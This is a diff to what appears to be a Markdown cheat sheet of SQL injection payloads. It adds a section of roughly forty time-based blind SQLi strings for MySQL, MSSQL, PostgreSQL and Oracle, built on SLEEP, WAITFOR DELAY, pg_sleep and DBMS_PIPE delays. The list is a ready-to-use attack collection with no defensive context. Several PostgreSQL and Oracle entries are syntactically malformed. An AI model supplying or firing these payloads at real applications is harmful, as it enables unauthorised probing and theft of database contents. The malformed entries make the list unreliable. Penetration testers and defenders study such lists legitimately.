@@ -179,7 +179,59 @@ Here are **200+ Boolean-Based Blind SQLi Payloads** categorized by database type
 - `' AND ROWNUM < 2 --`
 - `' AND (SELECT COUNT(*) FROM all_users) > 0 --`
 
+---
 
+## 📋 Time-Based Blind SQLi Payloads
+
+### MySQL
+- `' AND IF(1=1, SLEEP(5), 0) --`
+- `' AND IF(1=2, SLEEP(5), 0) --`
+- `' AND SLEEP(5) --`
+- `' AND BENCHMARK(5000000, MD5('A')) --`
+- `1 AND IF(1=1, SLEEP(5), 0) --`
+- `1 AND IF(1=2, SLEEP(5), 0) --`
+- `1' AND IF(1=1, SLEEP(5), 0) --`
+- `1' AND IF(1=2, SLEEP(5), 0) --`
+- `' OR SLEEP(5) --`
+- `' OR IF(1=1, SLEEP(5), 0) --`
+
+### MSSQL
+- `'; WAITFOR DELAY '0:0:5' --`
+- `' WAITFOR DELAY '00:00:05' --`
+- `' AND 1=1; WAITFOR DELAY '00:00:05' --`
+- `' AND 1=2; WAITFOR DELAY '00:00:05' --`
+- `'; IF (1=1) WAITFOR DELAY '00:00:05' --`
+- `'; IF (1=2) WAITFOR DELAY '00:00:05' --`
+- `'; IF EXISTS(SELECT * FROM sysobjects) WAITFOR DELAY '00:00:05' --`
+- `'; IF EXISTS(SELECT * FROM sysusers) WAITFOR DELAY '00:00:05' --`
+- `' OR 1=1; WAITFOR DELAY '00:00:05' --`
+- `' OR 1=2; WAITFOR DELAY '00:00:05' --`
+
+### PostgreSQL
+- `' AND pg_sleep(5) --`
+- `' OR pg_sleep(5) --`
+- `' AND 1=1; pg_sleep(5) --`
+- `' AND 1=2; pg_sleep(5) --`
+- `' AND (SELECT COUNT(*) FROM information_schema.tables) > 0; pg_sleep(5) --`
+- `' AND ASCII(SUBSTRING((SELECT current_user), 1, 1)) > 64; pg_sleep(5) --`
+- `' AND LENGTH(current_database()) > 5; pg_sleep(5) --`
+- `' AND EXISTS(SELECT table_name FROM information_schema.tables WHERE table_schema='public'); pg_sleep(5) --`
+- `' AND 1=(SELECT 1 FROM pg_database WHERE datname='postgres'); pg_sleep(5) --`
+- `' OR EXISTS(SELECT 1 FROM pg_roles WHERE rolname='postgres'); pg_sleep(5) --`
+
+### Oracle
+- `' AND DBMS_PIPE.RECEIVE_MESSAGE('A',5) --`
+- `' OR DBMS_PIPE.RECEIVE_MESSAGE('A',5) --`
+- `' AND 1=1; DBMS_PIPE.RECEIVE_MESSAGE('A',5) --`
+- `' AND 1=2; DBMS_PIPE.RECEIVE_MESSAGE('A',5) --`
+- `' AND (SELECT COUNT(*) FROM all_tables) > 0; DBMS_PIPE.RECEIVE_MESSAGE('A',5) --`
+- `' AND LENGTH((SELECT user FROM dual)) > 5; DBMS_PIPE.RECEIVE_MESSAGE('A',5) --`
+- `' AND (SELECT COUNT(*) FROM all_users) > 0; DBMS_PIPE.RECEIVE_MESSAGE('A',5) --`
+- `' AND ROWNUM < 2; DBMS_PIPE.RECEIVE_MESSAGE('A',5) --`
+- `' OR EXISTS(SELECT 1 FROM all_tables WHERE ROWNUM < 2); DBMS_PIPE.RECEIVE_MESSAGE('A',5) --`
+- `' AND EXISTS(SELECT 1 FROM dual WHERE 1=1); DBMS_PIPE.RECEIVE_MESSAGE('A',5) --`
+
+---
 
 
 
